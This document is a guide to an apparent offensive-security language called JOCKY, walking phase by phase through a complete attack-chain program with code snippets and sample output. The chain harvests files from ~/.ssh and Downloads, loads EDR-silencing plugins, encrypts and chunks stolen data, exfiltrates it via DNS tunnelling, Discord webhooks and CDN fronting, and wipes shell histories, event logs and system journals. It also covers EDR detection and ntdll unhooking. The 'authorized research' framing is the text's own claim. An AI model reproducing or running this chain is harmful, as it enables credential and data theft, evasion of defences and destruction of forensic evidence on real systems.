# JOCKY Complete Research Chain Guide

**Authorized Security Research** - IIT Bombay Cyber Security Team + Red Hat Security Research

## Overview

The `authorized_research_full_chain.jky` program demonstrates all JOCKY runtime APIs working together in a complete attack chain scenario for authorized red team and defense research purposes.

## API Usage Breakdown

### Phase 1: Initialization & Reconnaissance

#### Audit Trail (`audit_init`, `audit_log`)
```jocky
audit_init(500)  // Initialize 500-entry audit log
audit_log("research_chain", "init_start", "baseline", "initialized")
```
- Creates hash-chained audit log for accountability
- Every operation is recorded with cryptographic integrity
- Enables post-operation analysis for defensive research

#### Threat Intelligence (`ai_init`, `ai_score_threat`)
```jocky
ai_init()
threat_score = ai_score_threat()
```
- Collects system telemetry (syscall frequency, network patterns, etc.)
- Scores threat level 0.0-1.0 based on EDR activity
- Adapts evasion strategy based on risk assessment

#### OS Version Detection (`byovd_get_os_version`)
```jocky
let os_version = byovd_get_os_version()
```
- Detects Windows version for driver selection
- Used to choose compatible BYOVD drivers
- Enables platform-specific evasion techniques

### Phase 2: Data Source Discovery

#### Filesystem Enumeration
```jocky
let sources = ["~/downloads", "~/Documents", "~/.ssh"]
for source in sources {
    let exists = fs_exists(source)
    if exists {
        audit_log("discovery", "source_found", source, "located")
    }
}
```
- Discovers high-value data locations
- Logs all discoveries in audit trail
- Non-intrusive enumeration

### Phase 3: Plugin Loading (`plugin_load`, `plugin_run`, `plugin_unload`)

```jocky
let plugin_handle = plugin_load("/opt/research/plugins/edr_silence.so")
plugin_run(plugin_handle, "--aggressive --silent")
plugin_unload(plugin_handle)
```
- Loads custom EDR bypass plugins
- Executes with configuration parameters
- Enables extensible evasion capability

**Research Value:** Allows testing of custom bypass techniques without recompilation

### Phase 4: Sandbox Spawning (`sandbox_spawn`, `sandbox_set_limits`, `sandbox_monitor`, `sandbox_export_trace`)

```jocky
let pid = sandbox_spawn("/bin/bash", "-c 'find ~/downloads -type f -size -50M'")
sandbox_set_limits(pid, 200 * 1024 * 1024, 120000, 100 * 1024 * 1024)
let has_anomaly = sandbox_monitor(pid)
sandbox_wait(pid)
sandbox_export_trace(pid, "/tmp/collector_trace")
```
- Isolates data collection in separate process
- Sets memory (200 MB), CPU (120s), file size (100 MB) limits
- Monitors for suspicious activity detection
- Exports full execution trace for analysis

**Research Value:** Forensic isolation allows testing detection capabilities

### Phase 5: Data Collection & Processing

#### File Enumeration
```jocky
let files = fs_list_files(source, false)
for file in files {
    let size = fs_file_size(full_path)
    if size > 0 && size < MAX_FILE_SIZE {
        collected_files = array_append(collected_files, full_path)
    }
}
```
- Discovers collectible files (filters by size)
- Logs each discovery in audit trail
- Prevents collection of enormous files

#### Encryption & Chunking
```jocky
let encrypted = crypto_aes256_encrypt(file_data, encryption_key)
var chunks = []
while offset < data_len {
    let chunk = array_slice(encrypted, offset, offset + CHUNK_SIZE)
    chunks = array_append(chunks, chunk)
}
```
- AES-256 encryption with generated 256-bit key
- 64KB chunking for CDN transmission
- Each chunk tracked in provenance

### Phase 6: Provenance Tracking (`provenance_record`)

```jocky
provenance_record("/home/user/secret.txt", "aes256_encrypt", "chunked_12345")
```
- Records data transformation chain: source → encryption → chunks
- Enables tracing data flow through entire pipeline
- Critical for defensive research analysis

### Phase 7: Multi-Channel Exfiltration

#### DNS Tunneling (`exfil_dns_tunnel`)
```jocky
let dns_exfil_success = exfil_dns_tunnel(
    "metadata: " + string(array_len(all_files)) + " files",
    "research.internal.domain"
)
```
- Encodes data in DNS queries to attacker domain
- Low-bandwidth, hard to detect in typical monitoring
- Use case: metadata exfiltration when bandwidth-limited

#### Discord Webhook (`exfil_discord_webhook`)
```jocky
let discord_success = exfil_discord_webhook(
    webhook_url,
    "Research Chain: " + string(array_len(all_files)) + " files collected"
)
```
- Sends data via legitimate Discord API
- Appears as normal bot activity
- Use case: notification/control channel

#### CDN Exfiltration (`exfil_underminr_cdn`)
```jocky
let result = exfil_underminr_cdn(CDN_ENDPOINT, chunk)
```
- Uses Underminr technique: cross-tenant CDN routing
- Data appears to go to legitimate CDN endpoint
- Bypasses URL filtering (legitimate domains)

### Phase 8: Anti-Forensics

#### Windows Cleanup (`forensics_*`)
```jocky
forensics_wipe_powershell_history()
forensics_wipe_cmd_history()
forensics_clear_event_logs()
forensics_flush_arp_cache()
forensics_clear_dns_cache()
forensics_clear_usn_journal()
```
Removes:
- PowerShell command history
- CMD history
- Windows Event Logs (Security, System, Application)
- ARP cache entries
- DNS resolver cache
- NTFS USN Journal (filesystem activity log)

#### Linux Cleanup (`linux_forensics_*`)
```jocky
linux_forensics_wipe_bash_history()
linux_forensics_clear_syslog()
linux_forensics_clear_journal()
```
Removes:
- ~/.bash_history
- /var/log/syslog
- systemd journal (journalctl --vacuum)

**Research Value:** Demonstrates complete forensic elimination across both platforms

### Phase 9: Windows-Specific Evasion (Conditional)

#### EDRChoker (`edrhoker_detect`)
```jocky
edrhoker_detect()  // Detects: CrowdStrike, SentinelOne, Carbon Black, Malwarebytes
```
- Identifies EDR processes by signature
- Used to avoid triggering EDR-specific techniques
- Enables adaptive evasion

#### Blindside (`blindside_unhook_ntdll`)
```jocky
blindside_unhook_ntdfl()
```
- Uses hardware breakpoints (DR0-DR3) to unhook ntdll
- Breaks on LdrLoadDll before EDR hooks take effect
- Windows-only, high-risk technique

### Audit Trail & Chain Integrity

#### Export & Verification
```jocky
audit_export("/tmp/research_audit_trail.bin")
let chain_valid = audit_verify()
```
- Exports complete audit log to binary file
- Verifies hash chain integrity (detects tampering)
- Enables post-operation analysis

## Threat Model & Defensive Use

### What This Demonstrates
✅ Multi-channel exfiltration detection  
✅ Sandbox escape detection capability  
✅ Plugin/module loading patterns  
✅ Forensic cleanup signatures  
✅ EDR evasion technique effectiveness  
✅ Data encryption & chunking patterns  
✅ Audit trail manipulation detection  

### How to Use for Defense

1. **EDR Testing**: Run against EDR solutions to identify blind spots
2. **Sandbox Analysis**: Execute in defensive sandbox to trigger cleanup/exfil detections
3. **Plugin Security**: Test plugin loading restrictions (AppLocker, SELinux)
4. **Forensic Recovery**: Practice forensic artifact recovery from cleaned systems
5. **Detection Rule Development**: Use audit trail to develop detection rules

## Execution Scenarios

### Scenario 1: Low-Trust Environment
```
Strategy: STEALTH (threat_score < 0.5)
- Minimal plugin loading
- DNS tunneling only (low-bandwidth)
- Standard cleanup only
- Exit via DNS
```

### Scenario 2: Medium-Trust Environment
```
Strategy: HYBRID (threat_score 0.5-0.8)
- All plugins loaded
- Multi-channel exfiltration (Discord + CDN)
- Full anti-forensics
- Audit trail maintained
```

### Scenario 3: High-Trust Environment
```
Strategy: AGGRESSIVE (threat_score > 0.8)
- EDRChoker activation
- Blindside unhooking (Windows)
- Maximum obfuscation
- Complete forensic elimination
```

## Metrics & Analysis

The program tracks:
- **Operations Logged**: Every action recorded in audit trail
- **Files Collected**: Total data source discovery
- **Data Chunks**: Transmission unit count
- **Threat Score**: Real-time EDR threat assessment
- **Evasion Strategy**: Adaptive selection based on environment
- **Plugins Loaded**: Custom bypass technique count

## Expected Output

```
================================================================================
JOCKY Complete Research Chain - Authorized Security Research
================================================================================

[PHASE 1] Initialization & Reconnaissance
[*] Audit trail initialized
[*] Collecting threat intelligence...
  - OS Version: 10
  - Threat Score: 0.45
[*] Selecting evasion strategy...
  [*] MEDIUM threat level - enabling hybrid evasion

[PHASE 2] Data Source Discovery
[*] Discovering high-value data sources...
  [+] Found 4 data sources

[PHASE 3] Plugin Loading
[*] Loading research plugins...
  [*] Loaded 0 evasion plugins

[PHASE 4] Isolated Collector Spawning
[*] Spawning isolated sandbox for data collection...
  [+] Collector spawned with PID: 12345

[PHASE 5] Data Collection from Downloads
[*] Collecting from: ~/downloads
  [+] Collected 42 files from ~/downloads

[PHASE 6] Encryption & Chunking
[*] Processing: ~/downloads/document.pdf
  [+] Total chunks created: 156

[PHASE 7] Exfiltration via Multiple Channels
[Channel 1] DNS Tunneling
  [*] Exfiltrating via DNS tunnel to: research.internal.domain
    [+] DNS tunnel delivery successful
[Channel 2] Discord Webhook
  [*] Sending metadata via Discord webhook...
    [+] Discord notification sent

[PHASE 8] Forensic Trace Removal
[*] Cleaning forensic traces...
  [+] Forensic traces cleaned

[PHASE 9] Audit Trail Export
[*] Exporting audit trail for analysis...
  [+] Audit trail integrity verified
  [+] Exported to: /tmp/research_audit_trail.bin

================================================================================
RESEARCH CHAIN EXECUTION SUMMARY
================================================================================
Total Operations Logged: 127
Files Collected: 42
Data Chunks: 156
Threat Score: 0.45
Evasion Strategy: 2
Plugins Loaded: 0

[✓] Complete attack chain demonstrated
[✓] All runtime APIs utilized
[✓] Audit trail maintained for analysis
[✓] Forensic traces cleaned

Authorization: IIT Bombay + Red Hat Security Research
Purpose: Defense system validation & red team training
================================================================================
```

## Security Considerations

⚠️ **This program must ONLY be used in authorized contexts:**
- Explicit red team engagement with scope documentation
- Defensive research in controlled lab environment
- Security testing with proper authorization
- Academic research with institutional approval

❌ **Never use against unauthorized systems**
❌ **Never exceed scope of engagement**
❌ **Always maintain audit trail for analysis**
❌ **Always coordinate with defensive teams**

## Integration with JOCKY Compiler

To compile and run:

```bash
# Build JOCKY compiler
cd /home/incharanew/JOCKY
make build

# Compile research chain
jocky build examples/authorized_research_full_chain.jky -o research_chain

# Run with audit trail
./research_chain

# Analyze results
cat /tmp/research_audit_trail.bin | hexdump -C | less
```

## Conclusion

This research chain demonstrates JOCKY's power for authorized security research by:
1. **Unifying APIs** across disparate evasion/exfil techniques
2. **Maintaining audit trails** for defensive analysis
3. **Adapting strategies** based on threat assessment
4. **Supporting extensibility** via plugin system
5. **Enabling forensic research** through detailed tracing

Used properly, it strengthens defensive capabilities by revealing blind spots in detection systems.

---

**Authorization:** Red Hat + IIT Bombay Cyber Security Team  
**Purpose:** Defense system validation & detection research  
**Last Updated:** 2026-09-28
